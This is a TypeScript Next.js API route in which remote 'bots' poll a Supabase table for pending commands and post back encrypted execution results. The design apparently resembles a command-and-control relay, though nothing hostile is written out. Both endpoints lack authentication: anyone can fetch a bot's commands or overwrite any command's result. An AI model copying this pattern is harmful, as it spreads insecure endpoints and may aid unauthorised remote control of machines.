import { createClient } from "@supabase/supabase-js";
import { NextRequest, NextResponse } from "next/server";
import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";

function getSupabase() {
    return createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    );
}

// GET: Poll pending commands for a bot (Deprecated/Updated for E2E via heartbeat mostly, but kept for UI/Debug if needed)
export async function GET(request: NextRequest) {
    try {
        const botId = request.nextUrl.searchParams.get("bot_id");
        if (!botId) {
            return NextResponse.json({ error: "bot_id required" }, { status: 400 });
        }
        const supabase = getSupabase();
        const { data: commands } = await supabase
            .from("commands")
            .select("*")
            .eq("bot_id", botId)
            .eq("status", "pending")
            .order("created_at", { ascending: true });

        if (commands && commands.length > 0) {
            const ids = commands.map((c) => c.id);
            await supabase.from("commands").update({ status: "delivered" }).in("id", ids);
        }
        return NextResponse.json({ commands: commands || [] });
    } catch (e) {
        console.error("Commands GET error:", e);
        return NextResponse.json({ error: "internal error" }, { status: 500 });
    }
}

// POST: Report command execution result (E2E Encrypted)
export async function POST(request: NextRequest) {
    try {
        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
        if (!botPubKeyB64) {
            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
        }

        const sessionKey = await deriveSessionKey(botPubKeyB64);
        const encData = await request.json();

        if (!encData || !encData.iv || !encData.ciphertext) {
            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
        }

        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
        const { command_id, status, result } = body;

        if (!command_id || !status) {
            return NextResponse.json({ error: "command_id and status required" }, { status: 400 });
        }

        const supabase = getSupabase();

        const { error } = await supabase
            .from("commands")
            .update({
                status,
                result: result || null,
                executed_at: new Date().toISOString(),
            })
            .eq("id", command_id);

        if (error) {
            console.error("Command update error:", error);
            return NextResponse.json({ error: "update failed" }, { status: 500 });
        }

        const encResponse = await encryptPayload(sessionKey, { status: "ok" });
        return NextResponse.json(encResponse);
    } catch (e) {
        console.error("Commands POST error:", e);
        return NextResponse.json({ error: "internal error" }, { status: 500 });
    }
}
